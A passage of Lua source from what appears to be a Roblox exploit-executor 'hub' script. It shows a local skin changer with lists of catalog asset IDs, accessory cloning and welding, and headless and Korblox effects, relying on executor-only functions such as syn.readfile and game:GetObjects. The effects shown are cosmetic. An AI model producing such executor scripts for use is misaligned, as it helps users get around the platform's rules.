                        local hh = o:FindFirstChild("Handle") or o:FindFirstChildWhichIsA("BasePart", true)
                        if hh then handle = hh; break end
                    end
                    if handle then
                        local h = handle:Clone()
                        h.Name = "073Accessory"; h.CanCollide = false; h.Anchored = false; h.Massless = true
                        h.Parent = char
                        local w = Instance.new("Weld"); w.Part0 = head; w.Part1 = h
                        w.C0 = CFrame.new(config.offset or Vector3.zero); w.Parent = h
                    end
                    for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
                end
            end
            if config.korblox == "right" or config.korblox == "left" then
                local side = config.korblox
                local ids = { left = 139607673, right = 139607718 }
                local targets = { left = "LeftUpperLeg", right = "RightUpperLeg" }
                local hides = { left = {"LeftUpperLeg","LeftLowerLeg","LeftFoot"}, right = {"RightUpperLeg","RightLowerLeg","RightFoot"} }
                local tp = char:FindFirstChild(targets[side])
                if tp then
                    for _, pn in ipairs(hides[side]) do local l = char:FindFirstChild(pn); if l and l:IsA("BasePart") then l.Transparency = 1 end end
                    local objects = loadAssetObjects(ids[side])
                    if objects and #objects > 0 then
                        local am = objects[1]
                        local mm = am:IsA("BasePart") and am or am:FindFirstChildWhichIsA("BasePart", true)
                        if mm then
                            mm.Name = "Korblox_" .. side; mm.CanCollide = false; mm.Massless = true
                            mm.CFrame = tp.CFrame
                            local wc = Instance.new("WeldConstraint"); wc.Part0 = tp; wc.Part1 = mm; wc.Parent = mm
                            am.Parent = char
                        end
                    end
                end
            end
            return true
        end
        function BleedEng.apply(packName, char)
            char = char or LP.Character
            local config = PACKS[packName]
            if not char or not config then return false end
            if not origOutfit.shirt and not origOutfit.pants then saveOutfit(char) end
            if #origAcc == 0 then saveAcc(char) end
            for _, o in ipairs(char:GetChildren()) do if o:IsA("Shirt") or o:IsA("Pants") then o:Destroy() end end
            clearPack(char)
            local ok, res = pcall(applyBleed, config, char)
            if ok and res then BleedEng.active = packName; return true end
            return false
        end
        function BleedEng.off()
            local char = LP.Character
            BleedEng.active = "Off"
            if not char then return end
            pcall(function() clearPack(char); restoreOutfit(char); restoreAcc(char) end)
        end

        -- Custom Tools: Bloody Katana (Bat) + Medusa Skin (Medusa's Head) together
        local CT = { on = false, conns = {} }
        local KATANA_ID, MEDUSA_ID = 126653333198410, 11563251
        local function ctApplyTool(tool)
            if not CT.on or not tool or not tool:IsA("Tool") then return end
            if tool:FindFirstChild("Hub073GearVisual") then return end
            if tool.Name == "Bat" then pcall(applyAssetToTool, tool, KATANA_ID)
            elseif tool.Name == "Medusa's Head" then pcall(applyAssetToTool, tool, MEDUSA_ID) end
        end
        local function ctWatch(container)
            if not container then return end
            for _, t in ipairs(container:GetChildren()) do task.spawn(ctApplyTool, t) end
            table.insert(CT.conns, container.ChildAdded:Connect(function(t) task.wait(0.1); ctApplyTool(t) end))
        end
        local function ctDisconnect()
            for _, c in ipairs(CT.conns) do pcall(function() c:Disconnect() end) end
            CT.conns = {}
        end
        local function ctHook()
            ctDisconnect()
            ctWatch(LP:FindFirstChildOfClass("Backpack"))
            ctWatch(LP.Character)
            table.insert(CT.conns, LP.CharacterAdded:Connect(function()
                task.wait(0.8)
                if CT.on then ctHook() end
            end))
        end
        function BleedEng.setCustomTools(on)
            CT.on = on == true
            if CT.on then
                ctHook()
            else
                ctDisconnect()
                for _, tool in ipairs({getBatTool(), getMedusaTool()}) do
                    if tool then
                        pcall(clearGearVisual, tool)
                        if tool.Name == "Bat" then pcall(setBatSkinSound, tool, nil) end
                    end
                end
            end
        end
    end

    local SKIN_LIST = {
        {
            name = "TENUE 1", sub = "Space Hub outfit", kind = "outfit",
            shirtId = "18517930542", pantsId = "13572825731",
            accessories = {"17163576447"},
            headless = true, rightLeg = true,
            asset = 17163576447,
        },
        {
            name = "TENUE 2", sub = "Space Hub outfit", kind = "outfit",
            shirtId = "140584202280207", pantsId = "86970886981391",
            accessories = {"15625714011", "15625910919"},
            headless = true, rightLeg = true,
            asset = 15625714011,
        },
        {
            name = "TENUE 3", sub = "Space Hub outfit", kind = "outfit",
            shirtId = "127542925103240", pantsId = "6475285676",
            accessories = {"110695860265349", "5644816041"},
            headless = true, rightLeg = true,
            bodyColor = Color3.fromRGB(90, 89, 91),
            scales = {
                BodyDepthScale = 0.85, BodyHeightScale = 0.90,
                BodyProportionScale = 0.50, BodyTypeScale = 0.00,
                BodyWidthScale = 0.70, HeadScale = 0.95,
            },
            asset = 110695860265349,
        },
        {
            name = "TENUE 4", sub = "Space Hub outfit", kind = "outfit",
            shirtId = "138467256717912", pantsId = "6475285676",
            accessories = {"15625714011", "91864630618004", "18473875856"},
            headless = true, rightLeg = true,
            bodyColor = Color3.fromRGB(243, 223, 208),
            scales = {
                BodyDepthScale = 0.85, BodyHeightScale = 0.90,
                BodyProportionScale = 0.50, BodyTypeScale = 0.00,
                BodyWidthScale = 0.70, HeadScale = 0.95,
            },
            asset = 15625714011,
        },
        {
            name = "TENUE 5", sub = "Space Hub outfit", kind = "outfit",
            shirtId = "14138181304", pantsId = "117431351365360",
            accessories = {"117141606635719", "88101962627986", "11685171991"},
            headless = true, rightLeg = true,
            bodyColor = Color3.fromRGB(17, 17, 17),
            scales = {
                BodyDepthScale = 0.62, BodyHeightScale = 1.10,
                BodyProportionScale = 0.85, BodyTypeScale = 0.25,
                BodyWidthScale = 0.52, HeadScale = 0.92,
            },
            asset = 117141606635719,
        },
    
        -- Y_out / Bubble outfits (accessories list required for head pieces)
        {
            name = "OUTFIT 1", sub = "Y_out headless", kind = "outfit",
            primePreview = 125157548394108,
            primeBodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},
            primeItems = {125157548394108, 123231522991173, 74827642361405},
            shirtId = "9683332638", pantsId = "93182020184041",
            accessories = {"10159600649"},
            headless = true, rightLeg = true,
            asset = 10159600649,
        },
        {
            name = "OUTFIT 2", sub = "Y_out headless", kind = "outfit",
            primePreview = 136644276218918,
            primeBodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},
            primeItems = {136644276218918, 132022106987543, 131740907052260},
            primeScales = {HeightScale = 1, WidthScale = 0.85, DepthScale = 0.88, HeadScale = 0.95, BodyTypeScale = 1, ProportionScale = 0.85},
            primeFace = 86109936998865,
            primeFaceMode = "decal",
            shirtId = "9683332638", pantsId = "93182020184041",
            accessories = {"1744060292"},
            headless = true, rightLeg = true,
            asset = 1744060292,
        },
        {
            name = "OUTFIT 3", sub = "Y_out headless", kind = "outfit",
            primePreview = 119331031817124,
            primeBodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},
            primeItems = {119331031817124, 84952305140948},
            primeScales = {HeightScale = 1, WidthScale = 0.82, DepthScale = 0.85, HeadScale = 0.95, BodyTypeScale = 1, ProportionScale = 0.9},
            primeLayeredPuffiness = 0,
            primeHeadless = true,
            shirtId = "11926549070", pantsId = "13189494471",
            accessories = {"8349240186"},
            headless = true, rightLeg = true,
            asset = 8349240186,
        },
        {
            name = "OUTFIT 4", sub = "Y_out headless", kind = "outfit",
            primePreview = 18902416696,
            primeBodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},
            primeItems = {18902416696, 17739456422, 116750288839357, 12842417046, 122223069519702},
            primeScales = {HeightScale = 1, WidthScale = 0.82, DepthScale = 0.85, HeadScale = 0.95, BodyTypeScale = 1, ProportionScale = 0.9},
            primeLayeredPuffiness = 0,
            primeHeadless = true,
            shirtId = "123181702116947", pantsId = "93330291631062",
            accessories = {"121097973925756"},
            headless = true, rightLeg = true,
            asset = 121097973925756,
        },
        {
            name = "OUTFIT 5", sub = "Bubble local", kind = "outfit",
            primePreview = 13935333090,
            primeItems = {13935333090, 16110951997, 10632503818},
            accessories = {"13935333090"},
            headless = false, rightLeg = false,
            asset = 13935333090,
        },
        {
            name = "OUTFIT 6", sub = "Bubble headless", kind = "outfit",
            primePreview = 91274263831244,
            primeItems = {74891470, 4390891467, 91274263831244, 128424248603010, 91151766440767, 17044638424},
            primeHeadless = true,
            accessories = {"91274263831244"},
            headless = true, rightLeg = true,
            asset = 91274263831244,
        },
        {
            name = "VX7 SIG", sub = "Bubble signature", kind = "outfit",
            primePreview = 76479271580913,
            primeItems = {76479271580913, 1402432199, 140627490971265, 128912609563885, 17449551560, 5796531729, 139607718},
            primeLocalOnly = true,
            primeHideRightLeg = true,
            primeHeadless = true,
            accessories = {"76479271580913"},
            headless = false, rightLeg = false,
            asset = 76479271580913,
        },
        {
            name = "NEW SKIN", sub = "Invisible legs", kind = "outfit",
            primePreview = 82277826177074,
            primeItems = {70414871864071,14863917259,133498027006138,82277826177074},
            primeLocalOnly = true,
            primePreserveRig = true,
            primeHideLeftLeg = true,
            primeHideRightLeg = true,
            primeAccessorySlots = {[70414871864071]=Enum.AccessoryType.Waist,[14863917259]=Enum.AccessoryType.Neck, [133498027006138]=Enum.AccessoryType.Shoulder,[82277826177074]=Enum.AccessoryType.Sweater},
            accessories = {"82277826177074"},
            headless = false, rightLeg = true,
            asset = 82277826177074,
        },
        {
            name = "ALIEN", sub = "Local outfit", kind = "outfit",
            primePreview = 10997283529,
            primeBodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},
            primeItems = {10997283529, 125085889448130},
            accessories = {"10997283529"},
            headless = false, rightLeg = false,
            asset = 10997283529,
        },
        {
            name = "ZURICH THEME", sub = "Prime.Vs Skin", kind = "skin", asset = 9733132546,
            primeSkinChanger = true,
            primeShirtId = 9733132546,
            primePantsId = 101481154733615,
            primeTorsoMeshId = "http://www.roblox.com/asset/?id=1660648364",
            primeSkinAccessories = {111149505826763},
        },
        {
            name = "BLACK / BLUE", sub = "Prime.Vs Skin", kind = "skin", asset = 9733132546,
            primeSkinChanger = true,
            primeShirtId = 9733132546,
            primePantsId = 101481154733615,
            primeTorsoMeshId = "http://www.roblox.com/asset/?id=1660648364",
            primeSkinAccessories = {111149505826763},
        },
        {
            name = "BLACK / RED", sub = "Prime.Vs Skin", kind = "skin", asset = 10796276786,
            primeSkinChanger = true,
            primeShirtId = 10796276786,
            primePantsId = 101481154733615,
            primeTorsoMeshId = "http://www.roblox.com/asset/?id=1660648364",
            primeSkinAccessories = {111149505826763},
        },
        {
            name = "BLACK / WHITE", sub = "Prime.Vs Skin", kind = "skin", asset = 8844377623,
            primeSkinChanger = true,
            primeShirtId = 8844377623,
            primePantsId = 101481154733615,
            primeTorsoMeshId = "http://www.roblox.com/asset/?id=1660648364",
            primeSkinAccessories = {111149505826763},
        },
        {
            name = "WHITE / BLUE", sub = "Prime.Vs Skin", kind = "skin", asset = 16107371158,
            primeSkinChanger = true,
            primeShirtId = 16107371158,
            primePantsId = 101481154733615,
            primeTorsoMeshId = "http://www.roblox.com/asset/?id=1660648364",
            primeSkinAccessories = {111149505826763},
        },
        {
            name = "WHITE / RED", sub = "Prime.Vs Skin", kind = "skin", asset = 15970848598,
            primeSkinChanger = true,
            primeShirtId = 15970848598,
            primePantsId = 101481154733615,
            primeTorsoMeshId = "http://www.roblox.com/asset/?id=1660648364",
            primeSkinAccessories = {111149505826763},
        },
        {
            name = "WHITE / BLACK", sub = "Prime.Vs Skin", kind = "skin", asset = 8844377623,
            primeSkinChanger = true,
            primeShirtId = 8844377623,
            primePantsId = 101481154733615,
            primeTorsoMeshId = "http://www.roblox.com/asset/?id=1660648364",
            primeSkinAccessories = {111149505826763},
        },
        {
            name = "GATO MEME", sub = "Prime.Vs Skin", kind = "skin", asset = 130666125397672,
            primeSkinChanger = true,
            primeShirtId = 130666125397672,
            primePantsId = 91321960147976,
            primeTorsoMeshId = "http://www.roblox.com/asset/?id=1660648364",
            primeSkinAccessories = {111553288808103, 17274218093, 17387240647},
        },
        {
            name = "BATMAN", sub = "Prime.Vs Skin", kind = "skin", asset = 77038549270215,
            primeSkinChanger = true,
            primeShirtId = 77038549270215,
            primePantsId = 16717004839,
            primeTorsoMeshId = "http://www.roblox.com/asset/?id=1660648364",
            primeSkinAccessories = {127788745429250, 143803235928952},
        },
        {
            name = "MONSTER KORBLOX", sub = "Prime.Vs Skin", kind = "skin", asset = 8261840689,
            primeSkinChanger = true,
            primeShirtId = 7884186381,
            primePantsId = 13063157758,
            primeSkinAccessories = {8261840689},
            primeKorblox = true,
            primeHeadless = true,
        },
        {
            name = "HORNED KORBLOX", sub = "Prime.Vs Skin", kind = "skin", asset = 91950080535908,
            primeSkinChanger = true,
            primeShirtId = 9683332649,
            primePantsId = 13063157758,
            primeSkinAccessories = {91950080535908, 96954292222783, 17309352545, 132404403424262},
            primeKorblox = true,
            primeHeadless = true,
        },
        {
            name = "BLEED 1", sub = "Bleed Skin", kind = "bleed", bleedPack = "Bleed 1", asset = 306969564,
        },
        {
            name = "BLEED 2", sub = "Bleed Skin", kind = "bleed", bleedPack = "Bleed 2", asset = 1744060292,
        },
        {
            name = "BLEED 3", sub = "Bleed Skin", kind = "bleed", bleedPack = "Bleed 3", asset = 112564966849233,
        },
        {
            name = "BLEED 4", sub = "Bleed Skin", kind = "bleed", bleedPack = "Bleed 4", asset = 10159600649,
        },
        {
            name = "BLEED 5", sub = "Bleed Skin", kind = "bleed", bleedPack = "Bleed 5", asset = 8349240186,
        },
    }

    -- Explicit Save Skin snapshot is independent of ordinary automatic config saves.
    local savedSkinFile = CONFIG_FILE .. ".skin.json"
    do
        local ok, saved = pcall(function()
            local reader = readfile or (syn and syn.readfile) or (fluxus and fluxus.readfile)
            if not reader then return nil end
            return HttpService:JSONDecode(reader(savedSkinFile))
        end)
        if ok and type(saved) == "table" then
            local selection = tonumber(saved.selection)
            if type(saved.name) == "string" then
                for i, entry in ipairs(SKIN_LIST) do
                    if entry.name == saved.name then selection = i; break end
                end
            end
            if selection and selection == selection and selection >= 1 and selection <= #SKIN_LIST then
                State.skinSelection = math.floor(selection)
                State.skinEnabled = saved.enabled ~= false
            end
        end
        State.skinSelection = math.clamp(math.floor(tonumber(State.skinSelection) or 1), 1, #SKIN_LIST)
    end

    local eng = {
        gen = 0,
        hidden = {},
        visuals = {},
        assetCache = {},
        charConn = nil,
        watchConn = nil,
        wearableConn = nil,
        applying = false,
        originalColors = {},
        originalScales = {},
    }

    local function thumb(entry)
        if entry.primePreview then
            return "rbxthumb://type=Asset&id=" .. tostring(entry.primePreview) .. "&w=420&h=420"
        end
        if entry.asset then
            return "rbxthumb://type=Asset&id=" .. tostring(entry.asset) .. "&w=420&h=420"
        end
        if entry.shirtId then
            return "rbxthumb://type=Asset&id=" .. tostring(entry.shirtId) .. "&w=420&h=420"
        end
        return "rbxassetid://159454286"
    end

    local function isSkinOwned(inst)
        if not inst then return false end
        return inst:GetAttribute("BlastLocalSkin") == true
            or inst:GetAttribute("BlastSkinAsset") ~= nil
            or (type(inst.Name) == "string" and (
                inst.Name:sub(1, 11) == "BlastSkin_"
                or inst.Name:sub(1, 16) == "Misery_LocalOutfit"
                or inst.Name:sub(1, 18) == "BlastOutfitAccessory"
                or inst.Name == "BlastOutfitRightLeg"
                or inst.Name == "BlastOutfitShirt"
                or inst.Name == "BlastOutfitPants"
            ))
    end

    local function clearVisuals()
        for _, obj in ipairs(eng.visuals) do
            pcall(function() if obj and obj.Parent then obj:Destroy() end end)
        end
        eng.visuals = {}
        local char = LP.Character
        if not char then return end
        for _, child in ipairs(char:GetChildren()) do
            if isSkinOwned(child) then
                pcall(function() child:Destroy() end)
            end
        end
    end

    local function restoreHidden()
        for obj, data in pairs(eng.hidden) do
            pcall(function()
                if not obj or not obj.Parent then return end
                if type(data) == "table" then
                    if data.basePart then
                        if data.transparency ~= nil then obj.Transparency = data.transparency end
                        if data.localTransparency ~= nil then
                            pcall(function() obj.LocalTransparencyModifier = data.localTransparency end)
                        end
                    elseif data.property and data.value ~= nil then
                        obj[data.property] = data.value
                    end
                elseif type(data) == "number" then
                    if obj:IsA("BasePart") then
                        pcall(function() obj.LocalTransparencyModifier = data end)
                    elseif obj:IsA("Decal") or obj:IsA("Texture") then
                        obj.Transparency = data
                    end
                end
            end)
        end
        eng.hidden = {}
    end

    local function restoreColors()
        for part, col in pairs(eng.originalColors) do
            if part and part.Parent then pcall(function() part.Color = col end) end
        end
        eng.originalColors = {}
    end

    local function restoreScales(char)
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        for name, value in pairs(eng.originalScales) do
            local scale = hum:FindFirstChild(name)
            if scale and scale:IsA("NumberValue") then
                pcall(function() scale.Value = value end)
            end
        end
        eng.originalScales = {}
    end

    local function stopAll()
        eng.gen = eng.gen + 1
        if BleedEng.active ~= "Off" then BleedEng.off() end
        eng.applying = false
        if eng.charConn then pcall(function() eng.charConn:Disconnect() end); eng.charConn = nil end
        if eng.watchConn then pcall(function() eng.watchConn:Disconnect() end); eng.watchConn = nil end
        if eng.wearableConn then pcall(function() eng.wearableConn:Disconnect() end); eng.wearableConn = nil end
        clearVisuals()
        if eng.primeOriginal then
            local oldChar = eng.primeCharacter
            local oldHum = oldChar and oldChar:FindFirstChildOfClass("Humanoid")
            if oldChar == LP.Character and oldHum then
                pcall(function() oldHum:ApplyDescription(eng.primeOriginal) end)
            end
            eng.primeOriginal:Destroy()
            eng.primeOriginal = nil
            eng.primeCharacter = nil
        end
        restoreHidden()
        restoreColors()
        local char = LP.Character
        if not char then return end
        restoreScales(char)
        local head = char:FindFirstChild("Head")
        if head and head:IsA("BasePart") and not State.headlessEnabled then
            pcall(function()
                head.Transparency = 0
                head.LocalTransparencyModifier = 0
                head.CanCollide = true
                for _, d in ipairs(head:GetDescendants()) do
                    if (d:IsA("Decal") or d:IsA("Texture")) and not d:GetAttribute("BlastLocalSkin") then
                        d.Transparency = 0
                    end
                end
            end)
        end
        if not State.korbloxEnabled then
            for _, name in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot", "Right Leg", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "Left Leg"}) do
                local p = char:FindFirstChild(name)
                if p and p:IsA("BasePart") then
                    pcall(function()
                        p.Transparency = 0
                        p.LocalTransparencyModifier = 0
                    end)
                end
            end
        end
    end

    local function hideHead(char)
        local head = char:FindFirstChild("Head")
        if not (head and head:IsA("BasePart")) then return end
        head.Transparency = 1
        pcall(function() head.LocalTransparencyModifier = 1 end)
        for _, d in ipairs(head:GetDescendants()) do
            if d:IsA("Decal") or d:IsA("Texture") then d.Transparency = 1 end
        end
    end

    local function removeOriginalAccessories(char)
        for _, child in ipairs(char:GetChildren()) do
            if (child:IsA("Accessory") or child:IsA("Accoutrement")) and not isSkinOwned(child) then
                for _, object in ipairs(child:GetDescendants()) do
                    if object:IsA("BasePart") then
                        if eng.hidden[object] == nil then
                            eng.hidden[object] = {
                                basePart = true,
                                transparency = object.Transparency,
                                localTransparency = object.LocalTransparencyModifier,
                            }
                        end
                        object.Transparency = 1
                        pcall(function() object.LocalTransparencyModifier = 1 end)
                    elseif object:IsA("Decal") or object:IsA("Texture") then
                        if eng.hidden[object] == nil then eng.hidden[object] = object.Transparency end
                        object.Transparency = 1
                    end
                end
            end
        end
    end

    local function loadObjects(assetId)
        assetId = tonumber(assetId)
        if not assetId or assetId == 1 then return nil end
        if eng.assetCache[assetId] then
            local cached = eng.assetCache[assetId]
            local ok, clone = pcall(function() return cached:Clone() end)
            if ok and clone then return { clone } end
        end
        local results = nil
        if game.GetObjects then
            local ok, objects = pcall(function()
                return game:GetObjects("rbxassetid://" .. tostring(assetId))
            end)
            if ok and type(objects) == "table" and #objects > 0 then
                results = {}
                for _, inst in ipairs(objects) do
                    local ok2, clone = pcall(function() return inst:Clone() end)
                    table.insert(results, (ok2 and clone) or inst)
                end
                eng.assetCache[assetId] = objects[1]
            end
        end
        if (not results or #results == 0) then
            local ok2, inserted = pcall(function()
                return InsertService:LoadAsset(assetId)
            end)
            if ok2 and inserted then
                eng.assetCache[assetId] = inserted
                local ok3, clone = pcall(function() return inserted:Clone() end)
                results = { (ok3 and clone) or inserted }
            end
        end
        return results
    end

    -- Space Hub style accessory attach
    local function addAccessory(character, assetId, name, forceManual)
        if not assetId or tostring(assetId) == "" or tostring(assetId) == "1" then
            return false
        end
        local objects = loadObjects(assetId)
        if not objects or #objects == 0 then return false end

        local head = character:FindFirstChild("Head")
        if not head then return false end

        local function findAtt(char, attName)
            if not attName then return nil end
            for _, d in ipairs(char:GetDescendants()) do
                if d:IsA("Attachment") and d.Name == attName and d.Parent and d.Parent:IsA("BasePart") then
                    return d
                end
            end
            return nil
        end

        -- Gather Handle parts (clone) — same strategy as Y_out attachItem
        local handles = {}
        local function pushHandle(h)
            if not h or not h:IsA("BasePart") then return end
            local ok, cl = pcall(function() return h:Clone() end)
            table.insert(handles, (ok and cl) or h)
        end

        for _, root in ipairs(objects) do
            if root:IsA("Accessory") or root:IsA("Accoutrement") then
                pushHandle(root:FindFirstChild("Handle") or root:FindFirstChildWhichIsA("BasePart", true))
            elseif root:IsA("BasePart") then
                pushHandle(root)
            else
                local found = false
                for _, d in ipairs(root:GetDescendants()) do
                    if d:IsA("Accessory") or d:IsA("Accoutrement") then
                        pushHandle(d:FindFirstChild("Handle") or d:FindFirstChildWhichIsA("BasePart", true))
                        found = true
                    end
                end
                if not found then
                    pushHandle(root:FindFirstChild("Handle") or root:FindFirstChildWhichIsA("BasePart", true))
                end
            end
        end

        if #handles == 0 then return false end

        local anyOk = false
        for i, H in ipairs(handles) do
            H.Name = (name or "BlastOutfitAccessory") .. (i > 1 and ("_" .. tostring(i)) or "")
            H:SetAttribute("BlastLocalSkin", true)
            H:SetAttribute("BlastSkinAsset", tonumber(assetId) or assetId)

            -- Preserve only smoke effects that already belong to the original skin.
            -- The tag also prevents Anti Lag (including its DescendantAdded watcher)
            -- from disabling these effects after the cloned accessory is parented.
            local preservedSmoke = {}
            for _, effect in ipairs(H:GetDescendants()) do
                if (effect:IsA("Smoke") or effect:IsA("ParticleEmitter")) and effect.Enabled then
                    effect:SetAttribute("BlastPreserveSkinSmoke", true)
                    table.insert(preservedSmoke, effect)
                end
            end

            -- Visibility + physics
            local function prepPart(p)
                if not p:IsA("BasePart") then return end
                p.CanCollide = false
                p.Anchored = false
                p.Massless = true
                p.Transparency = 0
                pcall(function() p.LocalTransparencyModifier = 0 end)
                pcall(function() p.CanTouch = false end)
                pcall(function() p.CanQuery = false end)
            end
            prepPart(H)
            for _, d in ipairs(H:GetDescendants()) do
                prepPart(d)
                if d:IsA("Decal") or d:IsA("Texture") then
                    d.Transparency = 0
                end
            end

            for _, d in ipairs(H:GetChildren()) do
                if d:IsA("Weld") or d:IsA("WeldConstraint") or d:IsA("Motor6D") or d:IsA("RigidConstraint") then
                    pcall(function() d:Destroy() end)
                end
            end

            -- Placement (Y_out attachItem logic)
            local target, c0, c1
            local hAtt = H:FindFirstChildOfClass("Attachment")
            local bAtt = hAtt and findAtt(character, hAtt.Name)

            if bAtt and bAtt.Parent then
                target = bAtt.Parent
                c0 = bAtt.CFrame
                c1 = hAtt.CFrame
            else
                -- Default: ON TOP of head (proven Y_out offset)
                target = head
                c0 = CFrame.new(0, 1.4, 0)
                c1 = CFrame.new()
            end

            H.CFrame = target.CFrame * c0 * c1:Inverse()
            H.Parent = character
            for _, effect in ipairs(preservedSmoke) do
                if effect.Parent then effect.Enabled = true end
            end

            local w = Instance.new("Weld")
            w.Name = "BlastOutfitWeld"
            w:SetAttribute("BlastLocalSkin", true)
            w.Part0 = target
            w.Part1 = H
            w.C0 = c0
            w.C1 = c1
            w.Parent = H

            table.insert(eng.visuals, H)
            anyOk = true
        end

        return anyOk
    end

    local function applyShirtPants(char, entry)
        -- Remove existing shirt/pants (skin-owned or not)
        for _, child in ipairs(char:GetChildren()) do
            if child:IsA("Shirt") or child:IsA("Pants") then
                pcall(function() child:Destroy() end)
            end
        end
        if entry.shirtId and tostring(entry.shirtId) ~= "1" then
            local shirt = Instance.new("Shirt")
            shirt.Name = "BlastOutfitShirt"
            shirt.ShirtTemplate = "rbxassetid://" .. tostring(entry.shirtId)
            shirt:SetAttribute("BlastLocalSkin", true)
            shirt.Parent = char
            table.insert(eng.visuals, shirt)
        end
        if entry.pantsId and tostring(entry.pantsId) ~= "1" then
            local pants = Instance.new("Pants")
            pants.Name = "BlastOutfitPants"
            pants.PantsTemplate = "rbxassetid://" .. tostring(entry.pantsId)
            pants:SetAttribute("BlastLocalSkin", true)
            pants.Parent = char
            table.insert(eng.visuals, pants)
        end
    end

    local function applyBodyColor(char, color)
        if not color then return end
        for _, part in ipairs(char:GetChildren()) do
            if part:IsA("BasePart") and (
                part.Name:find("Torso")
                or part.Name:find("Arm")
                or part.Name:find("Leg")
                or part.Name:find("Foot")
                or part.Name:find("Hand")
                or part.Name == "Head"
            ) then
                if not eng.originalColors[part] then
                    eng.originalColors[part] = part.Color
                end
                part.Color = color
            end
        end
    end

    local function applyScales(char, scales)
        if not scales then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        for name, value in pairs(scales) do
            local scale = hum:FindFirstChild(name)
            if scale and scale:IsA("NumberValue") then
                if eng.originalScales[name] == nil then
                    eng.originalScales[name] = scale.Value
                end
                scale.Value = value
            end
        end
    end


    local function tryApplyOutfitId(char, assetId)
        assetId = tonumber(assetId)
        if not assetId then return false end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return false end
        local ok, desc = pcall(function()
            return Players:GetHumanoidDescriptionFromOutfitId(assetId)
        end)
        if ok and desc then
            local ok2 = pcall(function() hum:ApplyDescription(desc) end)
            return ok2 == true
        end
        return false
    end

    -- Prime outfits: assemble the actual outfit from its item catalog instead of
    -- treating the card thumbnail as an accessory. All calls remain in Blast's skin engine.
    local primeAssetTypes = {
        [17] = "Head", [27] = "Torso", [28] = "RightArm", [29] = "LeftArm",
        [30] = "LeftLeg", [31] = "RightLeg", [79] = "Head",
    }
    local primeAccessoryTypes = {
        [8] = Enum.AccessoryType.Hat, [41] = Enum.AccessoryType.Hair,
        [42] = Enum.AccessoryType.Face, [43] = Enum.AccessoryType.Neck,
        [44] = Enum.AccessoryType.Shoulder, [45] = Enum.AccessoryType.Front,
        [46] = Enum.AccessoryType.Back, [47] = Enum.AccessoryType.Waist,
        [64] = Enum.AccessoryType.TShirt, [65] = Enum.AccessoryType.Shirt,
        [66] = Enum.AccessoryType.Pants, [67] = Enum.AccessoryType.Jacket,
        [68] = Enum.AccessoryType.Sweater, [69] = Enum.AccessoryType.Shorts,
        [70] = Enum.AccessoryType.LeftShoe, [71] = Enum.AccessoryType.RightShoe,
        [72] = Enum.AccessoryType.DressSkirt, [76] = Enum.AccessoryType.Eyebrow,
        [77] = Enum.AccessoryType.Eyelash,
    }
    local primeMarketplace = game:GetService("MarketplaceService")
    local primeTypeCache = {}
    local function primeAssetType(id)
        if primeTypeCache[id] then return primeTypeCache[id] end
        local ok, info = pcall(primeMarketplace.GetProductInfo, primeMarketplace, id, Enum.InfoType.Asset)
        if ok and info and info.AssetTypeId then
            primeTypeCache[id] = info.AssetTypeId
            return info.AssetTypeId
        end
    end
    local function primeDescription(entry, hum)
        local ok, base = pcall(function() return hum:GetAppliedDescription() end)
        if not ok or not base then return nil end
        local desc = base:Clone()
        base:Destroy()
        desc.Shirt, desc.Pants, desc.GraphicTShirt = 0, 0, 0
        for _, prop in ipairs({"BackAccessory", "FaceAccessory", "FrontAccessory", "HairAccessory", "HatAccessory", "NeckAccessory", "ShouldersAccessory", "WaistAccessory", "TShirtAccessory", "ShirtAccessory", "PantsAccessory", "JacketAccessory", "SweaterAccessory", "ShortsAccessory", "DressSkirtAccessory", "EyebrowAccessory", "EyelashAccessory"}) do
            pcall(function() desc[prop] = "" end)
        end
        pcall(function() desc:SetAccessories({}, true) end)
        local accessories = {}
        for _, list in ipairs({entry.primeBodyItems or {}, entry.primeItems or {}}) do
            for _, id in ipairs(list) do
                local typeId = primeAssetType(id)
                local prop, accType = primeAssetTypes[typeId], primeAccessoryTypes[typeId]
                if prop then desc[prop] = id
                elseif typeId == 11 then desc.Shirt = id
                elseif typeId == 12 then desc.Pants = id
                elseif typeId == 1 then desc.GraphicTShirt = id
                elseif typeId == 18 then desc.Face = id
                elseif accType then
                    local info = {AssetId = id, AccessoryType = accType, Order = #accessories + 1}
                    if typeId >= 64 and typeId <= 72 then
                        info.IsLayered = true
                        info.Puffiness = entry.primeLayeredPuffiness or 0
                    end
                    table.insert(accessories, info)
                else
                    desc:Destroy()
                    return nil
                end
            end
        end
        if entry.primeFace and primeAssetType(entry.primeFace) == 18 then
            desc.Face = entry.primeFace
        end
        for prop, value in pairs(entry.primeScales or {}) do
            pcall(function() desc[prop] = value end)
        end
        if #accessories > 0 then
            local success = pcall(function() desc:SetAccessories(accessories, true) end)
            if not success then desc:Destroy(); return nil end
        end
        return desc
    end
    local function primeClothingTemplate(assetId, className, property)
        local roots = loadObjects(assetId)
        if roots then
            for _, root in ipairs(roots) do
                local garment = root:IsA(className) and root or root:FindFirstChildWhichIsA(className, true)
                if garment and garment[property] ~= "" then return garment[property] end
            end
        end
        return "rbxassetid://" .. tostring(assetId)
    end
    local function applyPrime(entry, char, gen)
        if gen ~= eng.gen or LP.Character ~= char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        if entry.primeSkinChanger then
            local skin = {
                shirtId = entry.primeShirtId,
                pantsId = entry.primePantsId,
            }
            -- Zurich clothing IDs are catalog IDs; their ShirtTemplate/PantsTemplate
            -- may be different image IDs, so resolve the templates before application.
            if skin.shirtId then skin.shirtTemplate = primeClothingTemplate(skin.shirtId, "Shirt", "ShirtTemplate") end
            if skin.pantsId then skin.pantsTemplate = primeClothingTemplate(skin.pantsId, "Pants", "PantsTemplate") end
            if gen ~= eng.gen then return end
            clearVisuals()
            removeOriginalAccessories(char)
